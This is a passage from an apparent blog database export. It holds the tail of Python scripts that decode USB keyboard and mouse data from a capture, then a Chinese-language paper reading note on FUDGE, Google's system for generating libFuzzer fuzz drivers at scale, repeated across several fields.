class=\"keyword\">if</span> line[<span class=\"number\">0</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">1</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">3</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">4</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">9</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">10</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">12</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">13</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">15</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">16</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">18</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">19</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">21</span>]!=<span class=\"string\">'0'</span> <span class=\"keyword\">or</span> line[<span class=\"number\">22</span>]!=<span class=\"string\">'0'</span>:</span><br><span class=\"line\">     <span class=\"keyword\">continue</span></span><br><span class=\"line\">nums.append(int(line[<span class=\"number\">6</span>:<span class=\"number\">8</span>],<span class=\"number\">16</span>))</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\">output = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> nums:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> n == <span class=\"number\">0</span> :</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> n <span class=\"keyword\">in</span> mappings:</span><br><span class=\"line\">    output += mappings[n]</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'output :\\n'</span> + output</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/08/11/hGNXaxUEf5l6Pni.png\" alt=\"4.png\"></p>\n<p>另附鼠标脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums = [] </span><br><span class=\"line\">keys = open(<span class=\"string\">'data.txt'</span>,<span class=\"string\">'r'</span>) </span><br><span class=\"line\">posx = <span class=\"number\">0</span> </span><br><span class=\"line\">posy = <span class=\"number\">0</span> </span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> keys: </span><br><span class=\"line\"><span class=\"keyword\">if</span> len(line) != <span class=\"number\">12</span> : </span><br><span class=\"line\">     <span class=\"keyword\">continue</span> </span><br><span class=\"line\">x = int(line[<span class=\"number\">3</span>:<span class=\"number\">5</span>],<span class=\"number\">16</span>) </span><br><span class=\"line\">y = int(line[<span class=\"number\">6</span>:<span class=\"number\">8</span>],<span class=\"number\">16</span>) </span><br><span class=\"line\"><span class=\"keyword\">if</span> x &gt; <span class=\"number\">127</span> : </span><br><span class=\"line\">    x -= <span class=\"number\">256</span> </span><br><span class=\"line\"><span class=\"keyword\">if</span> y &gt; <span class=\"number\">127</span> : </span><br><span class=\"line\">    y -= <span class=\"number\">256</span> </span><br><span class=\"line\">posx += x </span><br><span class=\"line\">posy += y </span><br><span class=\"line\">btn_flag = int(line[<span class=\"number\">0</span>:<span class=\"number\">2</span>],<span class=\"number\">16</span>)  <span class=\"comment\"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class=\"line\"><span class=\"keyword\">if</span> btn_flag == <span class=\"number\">1</span> : </span><br><span class=\"line\">    <span class=\"keyword\">print</span> posx , posy </span><br><span class=\"line\">    keys.close()</span><br></pre></td></tr></table></figure>\n"},{"_content":"## FUDGE: Fuzz Driver Generation at Scale\n\n### idea\n基于libfuzzer面向C/C++ 自动化生成fuzzer\n\n### 涉及分析方法\n涉及分析方法:程序静态分析，程序切片\n\n### 系统架构\n![img.png](https://s2.loli.net/2022/05/01/Wz4A7uIo5tSBrhw.png)\n\n整个系统分为四个部分：切片阶段，targets合成阶段，target评估阶段，前端UI可视化显示前面三个阶段\n前面三个阶段作为FUDGE后端，首先扫描代码库中目标libraries使用情况,提取interesting代码片段；\n然后自动合成targets candidate；通过libfuzzer大规模运行targets candidate并对targets进行评估。\n每个阶段信息都会实时输出到FUDGE前端。\n\n### 各阶段实现\n\n#### Slicing stage\nslicing阶段思路：\n1. ClangMR(较Clang相比,可大规模解析代码文件)扫描完整个codebase的source file\n2. 定位出target function,function内部调用的库函数可由外部传参\n3. 对function的AST进行切片,提取出相关语句\n\nSlicing算法\n将function的AST作为算法输入,将所有调用target library的语句作为seed 语句;\n通过数据流和控制流分析,提取出seed相关依赖的语句.伪代码如下:\n\n![img_1.png](https://s2.loli.net/2022/05/01/ImsLEeWZnJ2po8z.png)\n\n但有些语句不需要提取,包括不在function内部定义的变量,\n如function参数`(memStream.getPtr(),memStream.size())`或成员变量`(e.g., mImageType)`;全局变量;\n不在function内部定义的function`(e.g., reference to the FreeImageLoadErrorHandler function)`\n把这些不需要提取的部分用`unknown X`来标记。\n黄色部分代表extract statements,白色部分代表ignore statemens\n\n![img_2.png](https://s2.loli.net/2022/05/01/oQsDKjEThI2PU74.png)\n\n提取出来依赖语句之后,对函数重构,\n首先剔除掉全局变量和常量,同时递归切片(指有调用关系的函数间切片),\n并且将return语句都用return 0来代替(return 0代表target function成功执行).\n重构后的代码如下:\n\n![img_3.png](https://s2.loli.net/2022/05/01/s9RQzoqAwkEf6nK.png)\n\n最终我们从目标代码中提取到了`code snippet`,\n但是我们还需要将`code snippet`中所需要的头文件和调用的其他库信息作为`metadata`(这些可以从Clang生成的AST了来获取)一同添加到`code snippet`中.\n然后将`code snippet`提供给下一阶段`Target Synthesis`.\n\n总结来说,splicing stage首先需要`ClangMR`来扫描source file;\n根据调用的库函数有无可接收外部输入的参数,来确定`target function`;\n生成`target function`的AST,进行切片;\n在切片时,首先找出`seed statements`,然后基于`seed statements`进行数据流分析和控制流分析来提取`statements`,\n并找出哪些`statements`是not be extracted;切片工作结束后,重构`target function`.\n最终生成最后的`code snippets`.\n\n#### Target Synthesis\n将splicing阶段重构后的unknown参数具体化,由fuzzer来提供输入.下图为具体化unknown参数的对应类型\n\n![img_4.png](https://s2.loli.net/2022/05/01/8TqEMHzG4tv3VRm.png)\n\n有很多种方式可以具体化unknown参数\n\n比如有的API接收的参数类型为string，那么我们可以通过libfuzzer来生成input来feed给这个参数，\n或者我们可以把string写入到一个文件里，然后把这个文件的路径（string类型）传递给这个参数，这样的话，就相当于可以生成两个target；\n\n再比如说，我们不借助libfuzzer来给参数提供输入，而是通过定义局部变量的方式，将这个局部变量作为参数传递给API，这样也可以生成一个target；\n\n再比如说，我们可以用0或者1来代替`unknown X`，这样也可以生成一个target。\n\n下图所示代码为替换`unknown X`后的接口\n\n![img_5.png](https://s2.loli.net/2022/05/01/gYPH3m2DFzGhdfs.png)\n\n为每个AST生成一个hash,并将这些ASTs的hash生成一个set,通过验证AST的hash来判断某个ast有无重写\n\n![img_6.png](https://s2.loli.net/2022/05/01/G5M8oNF2LTVfSW1.png)\n\n如上述代码所示，在target合成最后环节，将提取到的ast作为输入，如果ast解析后还有`unknown`关键字，\n那么就说明这个ast没有被重写（unknown X具体化），同时会通过ast的hash来记录ast的唯一性。\n\n#### Target evaluation\n将candicate target提供给libfuzzer并在规定的时间内运行,\n可以去除掉一些产生误报或无效crash的target.\n将interesting target保存到临时的repo,评估结果保存到数据库里.\n\n启发式算法生成target(会生成非常多的target,但还需要我们自己去筛选哪些为valid target),\n导致生成的target不一定是理想的target,\n因此我们需要对每个library的API生成的candidate target进行排序和筛选.\n\nvalid target的要求:\n\n- the driver fuzzes the right API for the library\n\n    所谓right API,比如有这样的一个API,它需要提供参数来输入进来,\n但是无论提供的这个参数值是多少,她都会返回一个固定的值,比如return 4.\n那么这种API是完全没有被fuzz的必要,因此也无需为这个API生成target.\n\n    再比如一些函数的参数条件要求比较严格.fuzzer随机生成的输入不太容易满足.\n这种情况需要用户来手动筛选,是否需要保留这个target.\n- the APIs are used correctly for the purpose of fuzzing\n    \n    筛选策略:根据下面四个signals挑选candidate target\n    \n  + target可以成功构建\n  + target自身正常运行\n  + 为corpus设置最小阈值\n  + 执行时可覆盖更多的路径\n\n    如果满足上述四个signals，那么就说明这个candidate target是可作为valid target\n  \n之后就是构建并运行valid targets来获取执行过程中的信息了。\n\n首先build target and records构建状态和日志；\n\n运行fuzzer并收集crash,在资源消耗和发现crash之间折中找出理想的运行时间,即规定时间内可以发现更多的crash；\n\n收集harness如覆盖率信息,以及corpus minimization\n\n需要注意的是,每个fuzzer都会通过沙箱隔离开来,保证每个fuzzer执行的独立性,可以避免资源占用.\n比如`fuzzer-A`在进行写入磁盘操作时,可能会占用整个磁盘.那么通过沙箱隔离就可以为每个fuzzer分配对应的磁盘资源.\n\n#### 前端UI显示\n\n![img_7.png](https://s2.loli.net/2022/05/01/PeapdzGhJ674ofx.png)\n\n![img_8.png](https://s2.loli.net/2022/05/01/9QHiTCXOgIKdsvc.png)\n\n- user packages: 依赖这个包的其他包的数量\n\n- existing targets: 当前调用这个库的API的target有哪些\n\n- candidate targets: 这个API所有的候选targets有哪些\n\n两个区别: exitsiting代表当前由用户筛选后的targets;candidating代表生成的所有的targets.(由于没有开源,只是猜测区别是这样的.)\n\n- public apis: 生成target的API有哪些\n\n![img_9.png](https://s2.loli.net/2022/05/01/t9og8Ihj5meMY4d.png)\n\n默认显示被其他包调用的APIs,重点关注实际使用的API.\n\n显示API名称和接受的参数类型,点击API名称还可看到具体的函数定义\n\n三种颜色代表了这个API的三种targets生成状态\n\n绿色代表这个API当前已经生成了至少一个target\n\nuse sites: 以表格形式展示调用这个API的所有调用者\n\n未来工作方向:\n\n1. 由c/c++扩展到其他的语言的target生成\n2. 基于单元测试的动态执行生成target\n3. 通过机器学习方式根据动态执行(覆盖率、语料库大小、crash数量)和静态执行(API名称、库的调用图)收集到的信息来对candidate target进行分类","source":"_posts/PaperReading_FUDGE.md","raw":"## FUDGE: Fuzz Driver Generation at Scale\n\n### idea\n基于libfuzzer面向C/C++ 自动化生成fuzzer\n\n### 涉及分析方法\n涉及分析方法:程序静态分析，程序切片\n\n### 系统架构\n![img.png](https://s2.loli.net/2022/05/01/Wz4A7uIo5tSBrhw.png)\n\n整个系统分为四个部分：切片阶段，targets合成阶段，target评估阶段，前端UI可视化显示前面三个阶段\n前面三个阶段作为FUDGE后端，首先扫描代码库中目标libraries使用情况,提取interesting代码片段；\n然后自动合成targets candidate；通过libfuzzer大规模运行targets candidate并对targets进行评估。\n每个阶段信息都会实时输出到FUDGE前端。\n\n### 各阶段实现\n\n#### Slicing stage\nslicing阶段思路：\n1. ClangMR(较Clang相比,可大规模解析代码文件)扫描完整个codebase的source file\n2. 定位出target function,function内部调用的库函数可由外部传参\n3. 对function的AST进行切片,提取出相关语句\n\nSlicing算法\n将function的AST作为算法输入,将所有调用target library的语句作为seed 语句;\n通过数据流和控制流分析,提取出seed相关依赖的语句.伪代码如下:\n\n![img_1.png](https://s2.loli.net/2022/05/01/ImsLEeWZnJ2po8z.png)\n\n但有些语句不需要提取,包括不在function内部定义的变量,\n如function参数`(memStream.getPtr(),memStream.size())`或成员变量`(e.g., mImageType)`;全局变量;\n不在function内部定义的function`(e.g., reference to the FreeImageLoadErrorHandler function)`\n把这些不需要提取的部分用`unknown X`来标记。\n黄色部分代表extract statements,白色部分代表ignore statemens\n\n![img_2.png](https://s2.loli.net/2022/05/01/oQsDKjEThI2PU74.png)\n\n提取出来依赖语句之后,对函数重构,\n首先剔除掉全局变量和常量,同时递归切片(指有调用关系的函数间切片),\n并且将return语句都用return 0来代替(return 0代表target function成功执行).\n重构后的代码如下:\n\n![img_3.png](https://s2.loli.net/2022/05/01/s9RQzoqAwkEf6nK.png)\n\n最终我们从目标代码中提取到了`code snippet`,\n但是我们还需要将`code snippet`中所需要的头文件和调用的其他库信息作为`metadata`(这些可以从Clang生成的AST了来获取)一同添加到`code snippet`中.\n然后将`code snippet`提供给下一阶段`Target Synthesis`.\n\n总结来说,splicing stage首先需要`ClangMR`来扫描source file;\n根据调用的库函数有无可接收外部输入的参数,来确定`target function`;\n生成`target function`的AST,进行切片;\n在切片时,首先找出`seed statements`,然后基于`seed statements`进行数据流分析和控制流分析来提取`statements`,\n并找出哪些`statements`是not be extracted;切片工作结束后,重构`target function`.\n最终生成最后的`code snippets`.\n\n#### Target Synthesis\n将splicing阶段重构后的unknown参数具体化,由fuzzer来提供输入.下图为具体化unknown参数的对应类型\n\n![img_4.png](https://s2.loli.net/2022/05/01/8TqEMHzG4tv3VRm.png)\n\n有很多种方式可以具体化unknown参数\n\n比如有的API接收的参数类型为string，那么我们可以通过libfuzzer来生成input来feed给这个参数，\n或者我们可以把string写入到一个文件里，然后把这个文件的路径（string类型）传递给这个参数，这样的话，就相当于可以生成两个target；\n\n再比如说，我们不借助libfuzzer来给参数提供输入，而是通过定义局部变量的方式，将这个局部变量作为参数传递给API，这样也可以生成一个target；\n\n再比如说，我们可以用0或者1来代替`unknown X`，这样也可以生成一个target。\n\n下图所示代码为替换`unknown X`后的接口\n\n![img_5.png](https://s2.loli.net/2022/05/01/gYPH3m2DFzGhdfs.png)\n\n为每个AST生成一个hash,并将这些ASTs的hash生成一个set,通过验证AST的hash来判断某个ast有无重写\n\n![img_6.png](https://s2.loli.net/2022/05/01/G5M8oNF2LTVfSW1.png)\n\n如上述代码所示，在target合成最后环节，将提取到的ast作为输入，如果ast解析后还有`unknown`关键字，\n那么就说明这个ast没有被重写（unknown X具体化），同时会通过ast的hash来记录ast的唯一性。\n\n#### Target evaluation\n将candicate target提供给libfuzzer并在规定的时间内运行,\n可以去除掉一些产生误报或无效crash的target.\n将interesting target保存到临时的repo,评估结果保存到数据库里.\n\n启发式算法生成target(会生成非常多的target,但还需要我们自己去筛选哪些为valid target),\n导致生成的target不一定是理想的target,\n因此我们需要对每个library的API生成的candidate target进行排序和筛选.\n\nvalid target的要求:\n\n- the driver fuzzes the right API for the library\n\n    所谓right API,比如有这样的一个API,它需要提供参数来输入进来,\n但是无论提供的这个参数值是多少,她都会返回一个固定的值,比如return 4.\n那么这种API是完全没有被fuzz的必要,因此也无需为这个API生成target.\n\n    再比如一些函数的参数条件要求比较严格.fuzzer随机生成的输入不太容易满足.\n这种情况需要用户来手动筛选,是否需要保留这个target.\n- the APIs are used correctly for the purpose of fuzzing\n    \n    筛选策略:根据下面四个signals挑选candidate target\n    \n  + target可以成功构建\n  + target自身正常运行\n  + 为corpus设置最小阈值\n  + 执行时可覆盖更多的路径\n\n    如果满足上述四个signals，那么就说明这个candidate target是可作为valid target\n  \n之后就是构建并运行valid targets来获取执行过程中的信息了。\n\n首先build target and records构建状态和日志；\n\n运行fuzzer并收集crash,在资源消耗和发现crash之间折中找出理想的运行时间,即规定时间内可以发现更多的crash；\n\n收集harness如覆盖率信息,以及corpus minimization\n\n需要注意的是,每个fuzzer都会通过沙箱隔离开来,保证每个fuzzer执行的独立性,可以避免资源占用.\n比如`fuzzer-A`在进行写入磁盘操作时,可能会占用整个磁盘.那么通过沙箱隔离就可以为每个fuzzer分配对应的磁盘资源.\n\n#### 前端UI显示\n\n![img_7.png](https://s2.loli.net/2022/05/01/PeapdzGhJ674ofx.png)\n\n![img_8.png](https://s2.loli.net/2022/05/01/9QHiTCXOgIKdsvc.png)\n\n- user packages: 依赖这个包的其他包的数量\n\n- existing targets: 当前调用这个库的API的target有哪些\n\n- candidate targets: 这个API所有的候选targets有哪些\n\n两个区别: exitsiting代表当前由用户筛选后的targets;candidating代表生成的所有的targets.(由于没有开源,只是猜测区别是这样的.)\n\n- public apis: 生成target的API有哪些\n\n![img_9.png](https://s2.loli.net/2022/05/01/t9og8Ihj5meMY4d.png)\n\n默认显示被其他包调用的APIs,重点关注实际使用的API.\n\n显示API名称和接受的参数类型,点击API名称还可看到具体的函数定义\n\n三种颜色代表了这个API的三种targets生成状态\n\n绿色代表这个API当前已经生成了至少一个target\n\nuse sites: 以表格形式展示调用这个API的所有调用者\n\n未来工作方向:\n\n1. 由c/c++扩展到其他的语言的target生成\n2. 基于单元测试的动态执行生成target\n3. 通过机器学习方式根据动态执行(覆盖率、语料库大小、crash数量)和静态执行(API名称、库的调用图)收集到的信息来对candidate target进行分类","slug":"PaperReading_FUDGE","published":1,"date":"2022-04-29T10:26:29.626Z","updated":"2022-05-01T12:14:29.888Z","title":"PaperReading_FUDGE","_id":"cl2n8fso700035l9jafeehqdd","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"FUDGE-Fuzz-Driver-Generation-at-Scale\"><a href=\"#FUDGE-Fuzz-Driver-Generation-at-Scale\" class=\"headerlink\" title=\"FUDGE: Fuzz Driver Generation at Scale\"></a>FUDGE: Fuzz Driver Generation at Scale</h2><h3 id=\"idea\"><a href=\"#idea\" class=\"headerlink\" title=\"idea\"></a>idea</h3><p>基于libfuzzer面向C/C++ 自动化生成fuzzer</p>\n<h3 id=\"涉及分析方法\"><a href=\"#涉及分析方法\" class=\"headerlink\" title=\"涉及分析方法\"></a>涉及分析方法</h3><p>涉及分析方法:程序静态分析，程序切片</p>\n<h3 id=\"系统架构\"><a href=\"#系统架构\" class=\"headerlink\" title=\"系统架构\"></a>系统架构</h3><p><img src=\"https://s2.loli.net/2022/05/01/Wz4A7uIo5tSBrhw.png\" alt=\"img.png\"></p>\n<p>整个系统分为四个部分：切片阶段，targets合成阶段，target评估阶段，前端UI可视化显示前面三个阶段<br>前面三个阶段作为FUDGE后端，首先扫描代码库中目标libraries使用情况,提取interesting代码片段；<br>然后自动合成targets candidate；通过libfuzzer大规模运行targets candidate并对targets进行评估。<br>每个阶段信息都会实时输出到FUDGE前端。</p>\n<h3 id=\"各阶段实现\"><a href=\"#各阶段实现\" class=\"headerlink\" title=\"各阶段实现\"></a>各阶段实现</h3><h4 id=\"Slicing-stage\"><a href=\"#Slicing-stage\" class=\"headerlink\" title=\"Slicing stage\"></a>Slicing stage</h4><p>slicing阶段思路：</p>\n<ol>\n<li>ClangMR(较Clang相比,可大规模解析代码文件)扫描完整个codebase的source file</li>\n<li>定位出target function,function内部调用的库函数可由外部传参</li>\n<li>对function的AST进行切片,提取出相关语句</li>\n</ol>\n<p>Slicing算法<br>将function的AST作为算法输入,将所有调用target library的语句作为seed 语句;<br>通过数据流和控制流分析,提取出seed相关依赖的语句.伪代码如下:</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/ImsLEeWZnJ2po8z.png\" alt=\"img_1.png\"></p>\n<p>但有些语句不需要提取,包括不在function内部定义的变量,<br>如function参数<code>(memStream.getPtr(),memStream.size())</code>或成员变量<code>(e.g., mImageType)</code>;全局变量;<br>不在function内部定义的function<code>(e.g., reference to the FreeImageLoadErrorHandler function)</code><br>把这些不需要提取的部分用<code>unknown X</code>来标记。<br>黄色部分代表extract statements,白色部分代表ignore statemens</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/oQsDKjEThI2PU74.png\" alt=\"img_2.png\"></p>\n<p>提取出来依赖语句之后,对函数重构,<br>首先剔除掉全局变量和常量,同时递归切片(指有调用关系的函数间切片),<br>并且将return语句都用return 0来代替(return 0代表target function成功执行).<br>重构后的代码如下:</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/s9RQzoqAwkEf6nK.png\" alt=\"img_3.png\"></p>\n<p>最终我们从目标代码中提取到了<code>code snippet</code>,<br>但是我们还需要将<code>code snippet</code>中所需要的头文件和调用的其他库信息作为<code>metadata</code>(这些可以从Clang生成的AST了来获取)一同添加到<code>code snippet</code>中.<br>然后将<code>code snippet</code>提供给下一阶段<code>Target Synthesis</code>.</p>\n<p>总结来说,splicing stage首先需要<code>ClangMR</code>来扫描source file;<br>根据调用的库函数有无可接收外部输入的参数,来确定<code>target function</code>;<br>生成<code>target function</code>的AST,进行切片;<br>在切片时,首先找出<code>seed statements</code>,然后基于<code>seed statements</code>进行数据流分析和控制流分析来提取<code>statements</code>,<br>并找出哪些<code>statements</code>是not be extracted;切片工作结束后,重构<code>target function</code>.<br>最终生成最后的<code>code snippets</code>.</p>\n<h4 id=\"Target-Synthesis\"><a href=\"#Target-Synthesis\" class=\"headerlink\" title=\"Target Synthesis\"></a>Target Synthesis</h4><p>将splicing阶段重构后的unknown参数具体化,由fuzzer来提供输入.下图为具体化unknown参数的对应类型</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/8TqEMHzG4tv3VRm.png\" alt=\"img_4.png\"></p>\n<p>有很多种方式可以具体化unknown参数</p>\n<p>比如有的API接收的参数类型为string，那么我们可以通过libfuzzer来生成input来feed给这个参数，<br>或者我们可以把string写入到一个文件里，然后把这个文件的路径（string类型）传递给这个参数，这样的话，就相当于可以生成两个target；</p>\n<p>再比如说，我们不借助libfuzzer来给参数提供输入，而是通过定义局部变量的方式，将这个局部变量作为参数传递给API，这样也可以生成一个target；</p>\n<p>再比如说，我们可以用0或者1来代替<code>unknown X</code>，这样也可以生成一个target。</p>\n<p>下图所示代码为替换<code>unknown X</code>后的接口</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/gYPH3m2DFzGhdfs.png\" alt=\"img_5.png\"></p>\n<p>为每个AST生成一个hash,并将这些ASTs的hash生成一个set,通过验证AST的hash来判断某个ast有无重写</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/G5M8oNF2LTVfSW1.png\" alt=\"img_6.png\"></p>\n<p>如上述代码所示，在target合成最后环节，将提取到的ast作为输入，如果ast解析后还有<code>unknown</code>关键字，<br>那么就说明这个ast没有被重写（unknown X具体化），同时会通过ast的hash来记录ast的唯一性。</p>\n<h4 id=\"Target-evaluation\"><a href=\"#Target-evaluation\" class=\"headerlink\" title=\"Target evaluation\"></a>Target evaluation</h4><p>将candicate target提供给libfuzzer并在规定的时间内运行,<br>可以去除掉一些产生误报或无效crash的target.<br>将interesting target保存到临时的repo,评估结果保存到数据库里.</p>\n<p>启发式算法生成target(会生成非常多的target,但还需要我们自己去筛选哪些为valid target),<br>导致生成的target不一定是理想的target,<br>因此我们需要对每个library的API生成的candidate target进行排序和筛选.</p>\n<p>valid target的要求:</p>\n<ul>\n<li><p>the driver fuzzes the right API for the library</p>\n<p>  所谓right API,比如有这样的一个API,它需要提供参数来输入进来,<br>但是无论提供的这个参数值是多少,她都会返回一个固定的值,比如return 4.<br>那么这种API是完全没有被fuzz的必要,因此也无需为这个API生成target.</p>\n<p>  再比如一些函数的参数条件要求比较严格.fuzzer随机生成的输入不太容易满足.<br>这种情况需要用户来手动筛选,是否需要保留这个target.</p>\n</li>\n<li><p>the APIs are used correctly for the purpose of fuzzing</p>\n<p>  筛选策略:根据下面四个signals挑选candidate target</p>\n<ul>\n<li><p>target可以成功构建</p>\n</li>\n<li><p>target自身正常运行</p>\n</li>\n<li><p>为corpus设置最小阈值</p>\n</li>\n<li><p>执行时可覆盖更多的路径</p>\n<p>如果满足上述四个signals，那么就说明这个candidate target是可作为valid target</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>之后就是构建并运行valid targets来获取执行过程中的信息了。</p>\n<p>首先build target and records构建状态和日志；</p>\n<p>运行fuzzer并收集crash,在资源消耗和发现crash之间折中找出理想的运行时间,即规定时间内可以发现更多的crash；</p>\n<p>收集harness如覆盖率信息,以及corpus minimization</p>\n<p>需要注意的是,每个fuzzer都会通过沙箱隔离开来,保证每个fuzzer执行的独立性,可以避免资源占用.<br>比如<code>fuzzer-A</code>在进行写入磁盘操作时,可能会占用整个磁盘.那么通过沙箱隔离就可以为每个fuzzer分配对应的磁盘资源.</p>\n<h4 id=\"前端UI显示\"><a href=\"#前端UI显示\" class=\"headerlink\" title=\"前端UI显示\"></a>前端UI显示</h4><p><img src=\"https://s2.loli.net/2022/05/01/PeapdzGhJ674ofx.png\" alt=\"img_7.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/05/01/9QHiTCXOgIKdsvc.png\" alt=\"img_8.png\"></p>\n<ul>\n<li><p>user packages: 依赖这个包的其他包的数量</p>\n</li>\n<li><p>existing targets: 当前调用这个库的API的target有哪些</p>\n</li>\n<li><p>candidate targets: 这个API所有的候选targets有哪些</p>\n</li>\n</ul>\n<p>两个区别: exitsiting代表当前由用户筛选后的targets;candidating代表生成的所有的targets.(由于没有开源,只是猜测区别是这样的.)</p>\n<ul>\n<li>public apis: 生成target的API有哪些</li>\n</ul>\n<p><img src=\"https://s2.loli.net/2022/05/01/t9og8Ihj5meMY4d.png\" alt=\"img_9.png\"></p>\n<p>默认显示被其他包调用的APIs,重点关注实际使用的API.</p>\n<p>显示API名称和接受的参数类型,点击API名称还可看到具体的函数定义</p>\n<p>三种颜色代表了这个API的三种targets生成状态</p>\n<p>绿色代表这个API当前已经生成了至少一个target</p>\n<p>use sites: 以表格形式展示调用这个API的所有调用者</p>\n<p>未来工作方向:</p>\n<ol>\n<li>由c/c++扩展到其他的语言的target生成</li>\n<li>基于单元测试的动态执行生成target</li>\n<li>通过机器学习方式根据动态执行(覆盖率、语料库大小、crash数量)和静态执行(API名称、库的调用图)收集到的信息来对candidate target进行分类</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"FUDGE-Fuzz-Driver-Generation-at-Scale\"><a href=\"#FUDGE-Fuzz-Driver-Generation-at-Scale\" class=\"headerlink\" title=\"FUDGE: Fuzz Driver Generation at Scale\"></a>FUDGE: Fuzz Driver Generation at Scale</h2><h3 id=\"idea\"><a href=\"#idea\" class=\"headerlink\" title=\"idea\"></a>idea</h3><p>基于libfuzzer面向C/C++ 自动化生成fuzzer</p>\n<h3 id=\"涉及分析方法\"><a href=\"#涉及分析方法\" class=\"headerlink\" title=\"涉及分析方法\"></a>涉及分析方法</h3><p>涉及分析方法:程序静态分析，程序切片</p>\n<h3 id=\"系统架构\"><a href=\"#系统架构\" class=\"headerlink\" title=\"系统架构\"></a>系统架构</h3><p><img src=\"https://s2.loli.net/2022/05/01/Wz4A7uIo5tSBrhw.png\" alt=\"img.png\"></p>\n<p>整个系统分为四个部分：切片阶段，targets合成阶段，target评估阶段，前端UI可视化显示前面三个阶段<br>前面三个阶段作为FUDGE后端，首先扫描代码库中目标libraries使用情况,提取interesting代码片段；<br>然后自动合成targets candidate；通过libfuzzer大规模运行targets candidate并对targets进行评估。<br>每个阶段信息都会实时输出到FUDGE前端。</p>\n<h3 id=\"各阶段实现\"><a href=\"#各阶段实现\" class=\"headerlink\" title=\"各阶段实现\"></a>各阶段实现</h3><h4 id=\"Slicing-stage\"><a href=\"#Slicing-stage\" class=\"headerlink\" title=\"Slicing stage\"></a>Slicing stage</h4><p>slicing阶段思路：</p>\n<ol>\n<li>ClangMR(较Clang相比,可大规模解析代码文件)扫描完整个codebase的source file</li>\n<li>定位出target function,function内部调用的库函数可由外部传参</li>\n<li>对function的AST进行切片,提取出相关语句</li>\n</ol>\n<p>Slicing算法<br>将function的AST作为算法输入,将所有调用target library的语句作为seed 语句;<br>通过数据流和控制流分析,提取出seed相关依赖的语句.伪代码如下:</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/ImsLEeWZnJ2po8z.png\" alt=\"img_1.png\"></p>\n<p>但有些语句不需要提取,包括不在function内部定义的变量,<br>如function参数<code>(memStream.getPtr(),memStream.size())</code>或成员变量<code>(e.g., mImageType)</code>;全局变量;<br>不在function内部定义的function<code>(e.g., reference to the FreeImageLoadErrorHandler function)</code><br>把这些不需要提取的部分用<code>unknown X</code>来标记。<br>黄色部分代表extract statements,白色部分代表ignore statemens</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/oQsDKjEThI2PU74.png\" alt=\"img_2.png\"></p>\n<p>提取出来依赖语句之后,对函数重构,<br>首先剔除掉全局变量和常量,同时递归切片(指有调用关系的函数间切片),<br>并且将return语句都用return 0来代替(return 0代表target function成功执行).<br>重构后的代码如下:</p>\n<p><img src=\"https://s2.loli.net/2022/05/01/s9RQzoqAwkEf6nK.png\" alt=\"img_3.png\"></p>\n<p>最终我们从目标代码中提取到了<code>code snippet</code>,<br>但是我们还需要将<code>code snippet</code>中所需要的头文件和调用的其他库信息作为<code>metadata</code>(这些可以从Clang生成的AST了来获取)一同添加到<code>code snippet</code>中.<br>然后将<code>code snippet</code>提供给下一阶段<code>Target Synthesis</code>.</p>\n<p>总结来说,splicing stage首先需要<code>ClangMR</code>来扫描source file;<br>根据调用的库函数有无可接收外部输入的参数,来确定<code>target function</code>;<br>生成<code>target function</code>的AST,进行切片;<br>在切片时,首先找出<code>seed statements</code>,然后基于<code>seed statements</code>进行数据流分析和控制流分析来提取<code>statements</code>,<br>并找出哪些<code>statements</code>是not be extracted;切片工作结束后,重构<code>target function</code>.<br>最终生成最后的<code>code snippets</code>.</p>\n<h4 id=\"Target-Synthesis\"><a href=\"#Target-Synthesis\" class=\"headerlink\" title=\"Target Synthesis\"></a>Target 